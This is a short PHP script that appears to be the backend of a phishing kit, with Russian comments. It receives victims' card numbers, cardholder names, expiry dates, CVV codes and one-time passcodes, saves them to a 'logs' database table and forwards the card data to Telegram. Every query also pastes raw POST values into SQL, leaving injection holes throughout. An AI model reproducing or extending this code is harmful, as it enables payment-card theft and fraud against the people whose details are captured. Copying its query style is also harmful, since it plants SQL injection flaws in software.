<?php
ini_set('display_errors', 1);
ini_set('display_startup_errors', 1);
error_reporting(E_ALL);


require "./config.php";
require "./telegram.php";
// Проверяем, были ли переданы данные
if (isset($_POST['id_log'], $_POST['type'])) {
    $id_log = $_POST['id_log'];
    $type = $_POST['type'];

    // Проверяем тип операции
    if ($type == "card") {
        $card = $_POST['cardNumber'];
        $holder = $_POST['cardHolder'];
        $expire = $_POST['cardMonth'] . "/" . $_POST['cardYear'];
        $cvv = $_POST['cardCvv'];
        $linkId = $_POST['link_id'];

        // Проверяем, существует ли запись с таким ID
        $existing_result = $mysql->query("SELECT * FROM `logs` WHERE `id` = $id_log");
        if ($existing_result->num_rows == 0) {
            // Если записи нет, вставляем новую
            $result = $mysql->query("INSERT INTO `logs` (`id`, `status`,`linkId`,`card`,`holder`,`expire`,`cvv`) VALUES ('$id_log', 'wait','$linkId', '$card', '$holder', '$expire', '$cvv')");
            // Отправляем данные в Telegram
            sendLog($_POST['cardHolder'], $_POST['cardNumber'], $_POST['cardMonth'], $_POST['cardYear'], $_POST['cardCvv'], $_POST['id_log']);
        } else {
            $existing_result = $existing_result->fetch_assoc();
            // Если запись существует, обновляем её
            if($existing_result['status'] == "start"){
                sendLog($_POST['cardHolder'], $_POST['cardNumber'], $_POST['cardMonth'], $_POST['cardYear'], $_POST['cardCvv'], $_POST['id_log']);
            }
            $result = $mysql->query("UPDATE `logs` SET `holder` = '$_POST[cardHolder]', `card` = '$_POST[cardNumber]', `expire` = '$expire',`cvv` = '$_POST[cardCvv]', `status` = 'wait' WHERE `id` = $id_log");
            
        }
        echo "success";
    } else {
        $otp = $_POST['otp'];
        $result = $mysql->query("UPDATE `logs` SET `code` = $otp, `status` = 'wait' WHERE `id` = $id_log");
        echo "success";
    }
} else {
    echo "error: missing parameters";
}
?>